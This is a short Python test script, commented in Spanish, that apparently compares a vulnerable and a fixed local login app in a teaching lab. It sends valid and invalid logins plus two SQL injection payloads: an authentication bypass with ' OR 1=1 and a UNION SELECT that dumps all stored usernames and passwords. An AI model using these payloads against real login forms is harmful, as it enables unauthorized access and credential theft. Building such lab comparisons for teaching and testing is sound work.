"""Pruebas deliberadas exclusivamente contra las dos aplicaciones locales."""
import argparse
from html import unescape
import re
from urllib.parse import urlencode
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

parser = argparse.ArgumentParser(description='Compara el inicio de sesión y dos inyecciones en el laboratorio local.')
parser.add_argument('--puerto', type=int, choices=[5000, 5001], default=5000)
args = parser.parse_args()
url = f'http://127.0.0.1:{args.puerto}/'
casos = [
    ('Credenciales válidas', 'admin', 'clave123'),
    ('Credenciales inválidas', 'admin', 'incorrecta'),
    ('Bypass de autenticación', "' OR 1=1 -- ", 'x'),
    ('Extracción de registros ficticios', "' UNION SELECT group_concat(usuario || ':' || clave, ' | ') FROM usuarios -- ", 'x'),
]
for nombre, usuario, clave in casos:
    req = Request(url, data=urlencode({'usuario': usuario, 'clave': clave}).encode(), method='POST')
    try:
        try:
            respuesta = urlopen(req, timeout=5)
        except HTTPError as exc:
            respuesta = exc
        with respuesta:
            html = respuesta.read().decode('utf-8')
            coincidencia = re.search(r'<p id="resultado">(.*?)</p>', html, re.S)
            print(f'{nombre}: HTTP {respuesta.status} | {unescape(coincidencia.group(1)) if coincidencia else "Sin resultado identificable"}')
    except (URLError, TimeoutError) as exc:
        print(f'No se pudo conectar a {url}: {exc}. Inicia primero el servidor correspondiente.')
        raise SystemExit(1)
